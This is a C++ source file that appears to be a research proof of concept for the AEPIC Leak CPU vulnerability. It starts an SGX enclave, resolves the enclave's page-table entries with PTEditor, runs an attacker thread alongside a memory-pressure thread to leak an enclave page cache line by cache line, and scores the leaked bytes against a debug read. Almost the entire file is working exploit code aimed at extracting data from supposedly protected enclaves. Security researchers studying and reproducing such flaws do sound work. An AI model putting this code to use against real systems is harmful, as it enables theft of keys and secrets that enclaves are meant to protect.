
#include "aepic_interface.h"
#include "aepic_leak.h"
#include "ptedit_header.h"
#include "enclave_u.h"
#include "sgx_urts.h"

#include <algorithm>
#include <array>
#include <atomic>
#include <cassert>
#include <condition_variable>
#include <ctype.h>
#include <fcntl.h>
#include <map>
#include <mutex>
#include <pthread.h>
#include <queue>
#include <set>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <x86intrin.h>

#define TARGET_OFFSET 0x1a000

static aepic_data_pid data;

// threads
pthread_t attacker_thread[2];

void signal_handler(int sig) {
    if ( sig == SIGINT ) {
        stop_execution();
        printf("\nctrl+c handled\n");
    }
}

size_t encl_size() {
    return data.enclave_sizes[0];
}

char *encl_base() {
    return (char *)data.enclave_ids[0];
}

void hexdump(void *pAddressIn, long  lSize)
{
 char szBuf[100];
 long lIndent = 1;
 long lOutLen, lIndex, lIndex2, lOutLen2;
 long lRelPos;
 struct { char *pData; unsigned long lSize; } buf;
 unsigned char *pTmp,ucTmp;
 unsigned char *pAddress = (unsigned char *)pAddressIn;

   buf.pData   = (char *)pAddress;
   buf.lSize   = lSize;

   while (buf.lSize > 0)
   {
      pTmp     = (unsigned char *)buf.pData;
      lOutLen  = (int)buf.lSize;
      if (lOutLen > 16)
          lOutLen = 16;

      // create a 64-character formatted output line:
      sprintf(szBuf, " >                            "
                     "                      "
                     "    %08lX", pTmp-pAddress);
      lOutLen2 = lOutLen;

      for(lIndex = 1+lIndent, lIndex2 = 53-15+lIndent, lRelPos = 0;
          lOutLen2;
          lOutLen2--, lIndex += 2, lIndex2++
         )
      {
         ucTmp = *pTmp++;

         sprintf(szBuf + lIndex, "%02X ", (unsigned short)ucTmp);
         if(!isprint(ucTmp))  ucTmp = '.'; // nonprintable char
         szBuf[lIndex2] = ucTmp;

         if (!(++lRelPos & 3))     // extra blank after 4 bytes
         {  lIndex++; szBuf[lIndex+2] = ' '; }
      }

      if (!(lRelPos & 3)) lIndex--;

      szBuf[lIndex  ]   = '<';
      szBuf[lIndex+1]   = ' ';

      printf("%s\n", szBuf);

      buf.pData   += lOutLen;
      buf.lSize   -= lOutLen;
   }
}

uint8_t leaked_page[0x1000];
void *attacker_leaker(void *args) {
    set_cpu_mask(1llu << ATTACKER_LEAKER);
    size_t offset = (size_t) args;

    usleep(500 * 1000);
    uint8_t zeros[0x1000] = {0};

    auto     e   = ptedit_resolve(encl_base() + offset, data.pid);
    uint64_t pfn = (uint64_t)((e.pte >> 12) & ((1ull << 40) - 1));
    bool     nx  = PTEDIT_B(e.pte, PTEDIT_PAGE_BIT_NX);

    printf("leaking page %4lu/%4lu\n", offset / 0x1000, encl_size() / 0x1000);

    if ( pfn == 0 ) {
        return NULL;
    }

    for ( size_t line = 0; line < 64 && running; line += 2 ) {
        cache_line_t cl = leak_line(data.pid, encl_base(), offset, line);
    
    #ifdef DEBUG
        printf("%2lu → ", line);
        print_line(cl, false, true);
    #endif
        memcpy(leaked_page + (line)*64, cl.data(), 64);
        memcpy(leaked_page + (line + 1)*64, zeros, 64);
    }

    stop_execution();
    printf("[attacker] thread finished!\n");
    return NULL;
}

int main(int argc, char *argv[]) {
    sgx_launch_token_t token   = { 0 };
    sgx_status_t       ret     = SGX_ERROR_UNEXPECTED;
    int                updated = 0;

    if ( argc != 2) {
        printf("[debug_dumper ] usage %s enclave_path\n", argv[0]);
        return -1;
    }

    // Create enclave
    if ( sgx_create_enclave(argv[1], SGX_DEBUG_FLAG, &token, &updated, &global_eid, NULL) != SGX_SUCCESS ) {
        printf("[debug_dumper ] Failed to start enclave! sudo /opt/intel/sgx-aesm-service/startup.sh ?\n");
        return -1;
    }

    ecall_init(global_eid);

    printf("[debug_dumper ] dumping enclave\n");

    isgx = open("/dev/isgx", O_RDWR);
    if ( isgx < 0 ) {
        printf("[debug_dumper ] could not open isgx driver: sudo?\n");
        exit(-1);
    }

    if ( ptedit_init() ) {
        printf("Error: Could not initalize PTEditor, did you load the kernel module?\n");
        close(isgx);
        exit(-1);
    }

    data = aepic_get_data_pid(getpid());

    printf("[debug_dumper ] found %llu enclaves\n", data.enclaves);

    char * encl_base = (char *)data.enclave_ids[0];
    size_t encl_size = data.enclave_sizes[0];
    size_t target_offset = TARGET_OFFSET;

    // Dump the data with AEPIC LEAK
    // assert(signal(SIGSEGV, signal_handler) != SIG_ERR);
    assert(signal(SIGINT, signal_handler) != SIG_ERR);

    pthread_create(&attacker_thread[0], 0, attacker_leaker, (void*) TARGET_OFFSET);
    pthread_create(&attacker_thread[1], 0, attacker_memory_pressure, NULL);

    pthread_join(attacker_thread[0], NULL);
    pthread_join(attacker_thread[1], NULL);

    // Dump the data with debug read
    uint8_t target[4096];
    memset(target, -1, 0x1000);
    aepic_edbgrd(encl_base + target_offset, target, 4096);

    close(isgx);
    ptedit_cleanup();

    // Destroy enclave
    sgx_destroy_enclave(global_eid);

    // hexdump(target, 0x1000);
    // hexdump(leaked_page, 0x1000);

    unsigned long correct = 0;
    unsigned long total = 0;
    for (int i = 0; i < 0x1000; i++) {
        // skip the first 4 bytes of each APIC register
        if ( (i % 16) < 4) continue;

        // skip each odd cache line
        if ( (i / 64) % 2 ) continue;

        ++total;
        if (target[i] == leaked_page[i]) ++correct;
    }

    printf("[debug_dumper ] correct: %lu/%lu\n", correct, total);
    return 0;
}
